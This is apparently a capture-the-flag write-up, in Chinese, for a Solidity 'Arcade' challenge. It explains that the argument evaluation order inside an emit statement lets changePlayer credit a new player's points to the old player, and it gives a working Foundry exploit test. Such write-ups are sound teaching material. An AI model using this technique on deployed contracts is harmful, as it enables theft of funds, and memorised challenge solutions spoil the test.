漏洞点在 `changePlayer` 中 `emit PlayerChanged(_redeem(oldPlayer), _setNewPlayer(newPlayer));` 的求值顺序上，solidity 并没有规定需要以特定方式求值，对于 emit 调用，实现上 indexed 参数会从右向左求值，而其他参数会从左向右求值。因此这里会先 `_setNewPlayer`，再 `_redeem`，从而将新 player 的余额提取到旧 player 上。

只要先 earn 10 points，再从 player74 中获得 190 points 即可。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {ArcadeBase, Arcade} from "src/Arcade/Arcade.sol";

contract ArcadeTest is Test {
    ArcadeBase public arcadeBase;
    Arcade public arcade;

    address public you;
    address public player1;
    address public player2;
    address public player3;
    address public player4;

    function setUp() external {
        you = makeAddr("You");
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;

        vm.startPrank(you);
        arcadeBase = new ArcadeBase(startTime, endTime, fullScore);
        arcadeBase.setup();
        vm.stopPrank();
        arcade = arcadeBase.arcade();

        player1 = arcadeBase.player1();
        player2 = arcadeBase.player2();
        player3 = arcadeBase.player3();
        player4 = arcadeBase.player4();
    }

    function testExploit() public {
        // vm.warp(10 minutes);
        vm.startPrank(you);
        arcade.earn();
        arcade.redeem();
        arcade.changePlayer(player4);
        arcadeBase.solve();
        assertTrue(arcadeBase.isSolved());
        vm.stopPrank();
    }
}
```

